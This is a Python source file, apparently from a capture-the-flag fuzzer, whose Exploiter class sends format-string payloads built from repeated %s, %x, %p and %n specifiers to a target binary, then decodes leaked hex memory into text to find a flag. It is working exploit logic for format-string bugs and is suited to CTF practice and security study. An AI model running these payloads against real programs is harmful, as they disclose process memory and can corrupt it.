import logging
import re
from fuzzer.utils import run_process

logger = logging.getLogger(__name__)

class Exploiter:
    def __init__(self, executable, validate_output, initial_output, attack_keywords, marker):
        self.executable = executable
        self.validate_output = validate_output
        self.initial_output = initial_output
        self.attack_keywords = attack_keywords
        self.marker = marker

    @staticmethod
    def reverse_bytes(hex_value):
        # Split the hex value into bytes and reverse the order
        bytes_list = [hex_value[i:i+2] for i in range(0, len(hex_value), 2)]
        reversed_bytes = bytes_list[::-1]
        return ''.join(reversed_bytes)

    def extract_hex_patterns(self, text):
        hex_pattern = re.compile(r'([a-fA-F0-9]{16})')
        return hex_pattern.findall(text)

    def extract_flag_from_output(self, output):
        # Look for the flag pattern in the output
        flag_pattern = re.compile(r'flag\{[a-zA-Z0-9_]+\}')
        match = flag_pattern.search(output)
        if match:
            return match.group(0)
        return None

    def exploit_format_string(self, format_string_positions):
        format_specifiers = ['%s', '%d', '%x', '%f', '%p', '%n']
        for specifier in format_specifiers:
            test_input = self.marker + (specifier * (40 - len(self.marker)))  # Crafting the payload
            stdout, stderr = run_process(self.executable, test_input)
            logger.info(f"Testing format string with payload: {test_input}")

            # Check for hex patterns in the output
            hex_matches = self.extract_hex_patterns(stdout + stderr)
            if hex_matches:
                # logger.info(f"Hexadecimal patterns found: {hex_matches}")

                reversed_hex_values = [Exploiter.reverse_bytes(hv) for hv in hex_matches]
                flag = ""

                for hex_value in reversed_hex_values:
                    try:
                        flag += bytes.fromhex(hex_value).decode('ascii', 'ignore')
                    except Exception as e:
                        logger.error(f"Error decoding hex value {hex_value}: {e}")

                logger.info(f"Flag extracted: {flag}")

                # Check if the extracted flag contains the actual flag
                actual_flag = self.extract_flag_from_output(flag)
                if actual_flag:
                    logger.info(f"Flag found: {actual_flag}")
                    return actual_flag

        logger.info("No flag found in the anomalies.")
        return None

    def check_for_flag(self, hypothesis_results):
        for _, _, test_input, stdout, stderr, anomaly_detected in hypothesis_results:
            if anomaly_detected:
                flag = self.extract_flag_from_output(stdout + stderr)
                if flag:
                    logger.info(f"Flag found in the output:\nSTDOUT: {stdout}\nSTDERR: {stderr}")
                    return flag

        logger.info("No flag found in the hypothesis results.")
        return None
